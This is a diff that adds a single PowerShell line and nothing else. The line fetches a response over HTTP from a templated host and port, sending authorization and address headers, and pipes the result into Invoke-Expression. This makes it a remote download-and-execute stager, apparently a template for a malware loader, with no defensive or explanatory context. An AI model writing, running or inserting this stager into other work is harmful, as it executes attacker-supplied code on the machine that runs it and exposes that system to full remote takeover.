@@ -1,0 +1,1 @@
+(Invoke-RestMethod -Uri "http://%ip%:%hotplug%/" -Headers @{"Authorization"="%auth%"; "i"="%ip%"; "p"="%port%"}).ToString() | iex
